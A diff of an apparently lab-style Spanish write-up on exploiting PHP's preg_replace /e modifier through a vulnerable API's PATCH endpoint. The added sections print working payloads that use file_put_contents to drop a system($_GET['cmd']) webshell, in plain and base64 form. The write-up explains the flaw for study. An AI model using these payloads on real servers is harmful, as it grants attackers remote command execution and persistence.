@@ -1,11 +1,8 @@
-
----
-
 # Explotación de vulnerabilidad con `preg_replace /e` y uso de `file_put_contents`
 
 ## Contexto del ataque
 
-Hemos explotado una API vulnerable que nos permitía modificar el contenido de la web. El origen de la vulnerabilidad se encuentra en el uso inseguro de la función `preg_replace` con el modificador `/e`, el cual evalúa el contenido como código PHP. Este modificador fue **deprecado en PHP 5.5 y eliminado en PHP 7**, precisamente porque abre la puerta a ejecuciones de código arbitrario.
+Hemos explotado una API vulnerable que nos permitía modificar el contenido de la web. El origen de la vulnerabilidad se encuentra en el uso inseguro de la función `preg_replace` con el modificador `/e`, que permite la ejecución de código arbitrario.
 
 El ataque consistió en enviar una petición `PATCH` a la API con un payload malicioso que aprovechaba esta vulnerabilidad para ejecutar código en el servidor.
 
@@ -27,9 +24,22 @@ El ataque consistió en enviar una petición `PATCH` a la API con un payload mal
         ?>
     </div>
 </div>
-````
+```
 
-En este fragmento, la entrada del usuario (`$row['text']`) termina siendo ejecutada como código PHP debido al modificador `/e`. Aunque se intenta sanitizar con `htmlspecialchars`, esa sanitización afecta solo a lo que se imprime con `echo`, no al `preg_replace`. El `preg_replace` evalúa directamente el contenido de `$content` y nos permite inyectar código arbitrario.
+**Ejemplo de Explotación:**
+Este fragmento de código puede ser atacado de la siguiente forma:
+```php
+<?php
+// Simulación de entrada maliciosa:
+$input = "file_put_contents('exploit.php', '<?php echo shell_exec($_GET[\'cmd\']); ?>')";
+
+// Ejecución a través de `preg_replace`:
+preg_replace('/.*/e', $input, "Win");
+?>
+```
+En este caso, se creará en el servidor un archivo malicioso `exploit.php` que permitirá la ejecución remota de comandos.
+
+---
 
 ## Petición enviada
 
@@ -49,7 +59,7 @@ En este caso, el campo `text` contiene código PHP que será ejecutado por el `p
 El payload que se ejecuta en el servidor es:
 
 ```php
-file_put_contents('cmd.php', base64_decode('PD9waHAKICBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsKPz4K'))
+file_put_contents('cmd.php', base64_decode('PD9waHAKICBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsKPz4K'));
 ```
 
 ### Explicación
@@ -75,6 +85,15 @@ file_put_contents('cmd.php', base64_decode('PD9waHAKICBzeXN0ZW0oJF9HRVRbJ2NtZCdd
     
     Este es un webshell muy simple que ejecuta cualquier comando del sistema que se le pase como parámetro `cmd` en la URL.
     
+---
+
+### Ejemplo completo de payload:
+```php
+<?php
+// Crear un webshell
+file_put_contents('cmd.php', '<?php system($_GET["cmd"]); ?>');
+?>
+```
 
 ### Resultado
 
@@ -101,6 +120,4 @@ Esto nos da control sobre el sistema comprometido.
 
 ## Conclusión
 
-La vulnerabilidad se origina en el uso inseguro de `preg_replace` con el modificador `/e`, que permite la ejecución de código arbitrario. Aprovechamos esta debilidad para ejecutar un payload que crea un archivo malicioso mediante `file_put_contents`. El archivo generado (`cmd.php`) es un webshell que nos permite persistencia y ejecución remota de comandos en el servidor.
-
----
+La vulnerabilidad se origina en el uso inseguro de `preg_replace` con el modificador `/e`, que permite la ejecución de código arbitrario. Aprovechamos esta debilidad para ejecutar un payload que nos da acceso remoto al servidor.
